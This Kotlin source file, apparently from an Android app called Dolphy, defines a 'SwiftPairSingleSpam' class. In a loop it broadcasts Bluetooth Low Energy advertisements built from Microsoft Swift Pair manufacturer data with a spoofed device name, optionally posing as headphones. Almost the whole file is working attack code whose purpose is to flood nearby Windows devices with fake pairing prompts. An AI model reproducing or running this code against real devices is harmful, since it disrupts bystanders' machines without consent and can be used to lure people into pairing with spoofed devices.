package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import java.io.ByteArrayOutputStream
import java.nio.charset.StandardCharsets
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class SwiftPairSingleSpam(
    private val name: String,
    private val isHeadphone: Boolean
) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    override fun start() {
        executor.execute {
            isSpamming = true
            val advertiser = BluetoothAdvertiser()
            val data = buildAdvertiseData(name, isHeadphone, Helper.canUseExtendedAdvertising())

            while (isSpamming) {
                advertiser.advertise(data, null)
                blinkRunnable?.run()
                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (_: InterruptedException) {
                    break
                }
                advertiser.stopAdvertising()
            }
        }
    }

    override fun stop() {
        isSpamming = false
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun setBlinkRunnable(runnable: Runnable?) {
        blinkRunnable = runnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    private fun buildAdvertiseData(name: String, headphone: Boolean, isExtended: Boolean): AdvertiseData {
        val out = ByteArrayOutputStream()
        if (headphone) {
            out.write(
                byteArrayOf(
                    0x03,
                    0x01,
                    0x80.toByte(),
                    0xD7.toByte(), 0x2F, 0xD2.toByte(),
                    0xF4.toByte(), 0x61, 0xE4.toByte(),
                    0x04, 0x04, 0x00
                )
            )
            val finalName = if (isExtended) name else name.take(18)
            out.write(finalName.toByteArray(StandardCharsets.UTF_8))
        } else {
            out.write(
                byteArrayOf(
                    0x03,
                    0x00,
                    0x80.toByte()
                )
            )
            val finalName = if (isExtended) name else name.take(24)
            out.write(finalName.toByteArray(StandardCharsets.UTF_8))
        }

        return AdvertiseData.Builder()
            .addManufacturerData(0x0006, out.toByteArray())
            .build()
    }
}

